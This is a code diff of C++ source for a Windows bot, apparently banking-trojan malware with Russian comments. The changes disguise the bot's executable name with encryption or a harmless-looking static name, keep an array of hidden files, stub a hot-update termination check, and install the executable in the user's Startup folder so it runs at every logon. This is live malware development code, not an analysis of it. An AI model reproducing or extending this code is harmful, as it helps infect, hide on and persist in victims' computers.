@@ -82,7 +82,7 @@ DWORD BOT_HIDDEN_FILES[MAX_HIDDEN_FILES + 1] = {0};
 
 
 // Шифрованное имя исполняемого файла бота
-char CryptedBotExeName[MAX_CRYPTED_EXE_NAME_SIZE + 1] = {0};
+char CryptedBotExeName[MAX_CRYPTED_EXE_NAME_SIZE] = {0};
 
 
 DWORD BotExeNameHash        = 0; // Хэш имени бота
@@ -576,6 +576,19 @@ void BOT::InitializeApi()
 //----------------------------------------------------------------------------
 
 //----------------------------------------------------
+//  Функция вернёт истину если поступила команда
+//  прерваь работу бота. Задействовано для горячего
+//  апдейта бота.
+//
+//  В данный момент функция-заглушка
+//----------------------------------------------------
+bool BOT::Terminated() 
+{ 
+	return false; 
+}
+
+
+//----------------------------------------------------
 // GetBotPath - Имя крневого каталога бота
 //              В этом каталоге будут лежать самые
 //              выжные файлы бота.
@@ -614,37 +627,33 @@ PCHAR BOT::GetBotExeName()
 	// При необходимости генерируем имя бота
 	if (STR::IsEmpty(CryptedBotExeName))
 	{
-		PCHAR Name = UIDCrypt::CryptFileName(GetStr(EStrOriginalBotExeName).t_str(), false);
+		// Для 32 разрядного бота работающего на 64 разрядной
+		// винде имя файла будет статический и представять
+		// для юзера что-то удобочитаемое
 
-		DWORD CopySize = STRA::Length(Name) + 1;
-		DWORD StartPos = 0;
+		#ifdef _WIN64
+			bool UseStaticName = false;
+		#else
+			bool UseStaticName = IsWIN64();
+		#endif
 
+		string Exe = GetStr(EStrOriginalBotExeName);
 
-		//***********************************************************
-		//  Попался случай когда имя езе бота оказалось без
-		//  ресширения файла. Сучай встретился на тестовой машине и
-		//  однй сборке, определить кто виновник не удалось.
-		//  в данный момент сделал "заглушку бага"
-		//***********************************************************
-        const static char* Exe = ".exe";
-		const static DWORD MaxSize = MAX_CRYPTED_EXE_NAME_SIZE - 4;
-
-
-
-		if (CopySize > MaxSize)
+		// Создаём динамическое имя
+		if (!UseStaticName)
 		{
-			// Имя файла больше массива
-			StartPos = CopySize - MaxSize;
-            CopySize -= StartPos;
-		}
-		STR::Copy(Name, CryptedBotExeName, StartPos, CopySize);
+			PCHAR Name = UIDCrypt::CryptFileName(Exe.t_str(), false);
+			Exe = Name;
+			STR::Free(Name);
+        }
 
-		// Продолжение заглушки. Проверем наличие расширения
-		if (STRA::Pos(CryptedBotExeName, Exe) < 0)
-			m_lstrcat(CryptedBotExeName, Exe);
+		DWORD Max = MAX_CRYPTED_EXE_NAME_SIZE - 5;
+		if (Exe.Length() > Max)
+			Exe.SetLength(Max);
 
+		Exe += ".exe";
 
-		STR::Free(Name);
+		STR::Copy(Exe.t_str(), CryptedBotExeName, 0, Exe.Length() + 1);
 
 		// Расчитываем хэш имени
 		BotExeNameHash = STRA::Hash(CryptedBotExeName);
@@ -690,26 +699,7 @@ string BOT::GetBotFullExeName()
 {
 	if (BotData->BotExeName.IsEmpty())
 	{
-
-		// Временный патч. В Висте и старше получаем папку текущего юзера
-		int CSIDL = CSIDL_COMMON_STARTUP;
-
-		#ifdef USE_CURRENT_USER
-			OSVERSIONINFOEXA OSVersion;
-
-			OSVersion.dwOSVersionInfoSize = sizeof( OSVERSIONINFOEXA );
-
-			if (pGetVersionExA( (OSVERSIONINFOA*)&OSVersion ) )
-			{
-				if ( OSVersion.dwMajorVersion >= 6 )
-				{
-					CSIDL =  CSIDL_STARTUP;
-				}
-			}
-		#endif
-
-
-		BotData->BotExeName = GetSpecialFolderPathA(CSIDL, GetBotExeName());
+		BotData->BotExeName = GetSpecialFolderPathA(CSIDL_STARTUP, GetBotExeName());
 	}
     return BotData->BotExeName;
 }
